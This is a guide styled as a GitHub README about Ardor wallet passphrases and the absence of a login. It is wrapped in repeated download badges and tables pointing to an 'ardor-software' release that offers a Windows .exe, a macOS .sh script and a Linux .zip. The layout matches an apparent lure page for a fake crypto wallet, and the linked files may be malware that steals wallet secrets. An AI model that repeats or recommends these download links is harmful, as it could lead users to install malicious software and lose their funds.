![Ardor Wallet guide](assets/banner-article.png)

# Is there an Ardor wallet login? What the passphrase really is

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

There is no Ardor wallet login in the account-and-password sense. The wallet opens with your passphrase or seed, or with a public address in read-only mode, and the web client at ardor.jelurida.com only displays balances. Sending ARDR requires the desktop wallet, because signing happens on your machine and not on a server.

## What people mean by login

The word login carries an assumption the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) does not share: that a company holds an account for you, checks a password, and can restore access when you forget it. None of that exists here. An Ardor account is a pair of keys derived from a secret you hold, and the wallet is a tool that derives the same account from the same secret every time you type it.

That is why the login screen has more than one tab, and why the tabs are not interchangeable. The [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) tab derives an account from a secret and can sign transactions. The account tab accepts a public address and shows what that address holds, with no ability to spend. Choosing the wrong one produces the error people describe as "my passphrase belongs to another account", which is not a login failure at all.

## The three ways in

| What you have | Which tab | What it can do |
|---|---|---|
| A passphrase or a seed | Passphrase tab | Derive the account, sign, send, forge, trade |
| A public address | Account tab | Read balances and history only |
| A hardware device | Ledger sign-in | Sign on the device, with the key never on the computer |

Every character of a passphrase matters. One added space, one capital letter, one missing word produces a different [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) with a different address, and the wallet has no way to know that this was not what you intended. That single behaviour explains most reports of a wallet that "lost" an account.

## Why there is no reset

A reset needs a party that knows your secret or can override it. The wallet has neither, by design. Nobody at the project can derive your account from an email address, and there is no server-side record that could be restored. The secret is the account, in the same way that a key is the lock.

This is not a missing feature to be worked around. It is the property that makes self-custody worth anything: no support desk, no insider and no attacker who compromises the project can move your funds. The cost is that the written copy you made at setup is the only copy, and the recovery utility that ships with the wallet can only search for a near miss, not recreate a forgotten secret.

## What the web client can and cannot do

The web client is a read-only view. It shows balances and transaction history for an address you enter, which makes it useful for a quick check from a machine you do not trust with a secret. It cannot sign, so it cannot send, forge, trade or change anything, and a withdrawal attempted there fails with an error about the API rather than a password prompt.

Use it that way deliberately: look, then close the tab. Never type a passphrase into a page that offers to unlock an account, because a read-only client has no reason to ask for one and a page that does is not the client.

## Signing in on a new computer

Install the wallet, choose full or [light client](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md), and enter the same passphrase or seed on the passphrase tab. The account appears with its balance once the chain is available, with no migration step and no transfer between machines.

On a full client that means waiting for the chain to sync before the balance is correct. On a light client the balance appears once a remote node answers. If the address is right but the balance is zero, the cause is the sync state rather than the login, and the zero balance guide covers how to tell the two apart.

If you move to a new machine permanently, keep the old installation until the new one has opened the same address and sent a test transaction. Deleting the old copy first turns a five-minute check into a recovery problem.

## Signing out safely

Closing the wallet is the sign-out. There is no session to expire and no token to revoke, because nothing was granted to a server. What remains on the machine is the installation and, on a full client, the blockchain database, neither of which can spend without the secret.

On a shared computer, close the wallet and clear anything that could hold the secret: clipboard history, a notes app, a screenshot folder. The wallet does not keep the passphrase between sessions, so the risk is everything around it rather than the app itself.

## FAQ

### Why does my passphrase open a different account than before?

A single changed character derives a completely different account. Check spacing, capitalisation and the word order against your written copy, then use the recovery utility if the difference is a small typo.

### Can I log in with my email address?

No. There is no email, username or password attached to an Ardor account, and no service that maps one to an address.

### Is the web wallet safe to use?

Reading a balance there is safe, since the page never asks for the secret. It cannot send, so anything that asks you to unlock it is not the web wallet behaving normally.

### Does the mobile app log in the same way?

Ardor Lite signs locally with the same secret and covers Ardor and all child chains. The login model is identical: the secret derives the account, and the app never sends it anywhere.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Send ARDR to an exchange, clear a malformed recipient, and trace a missing deposit](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
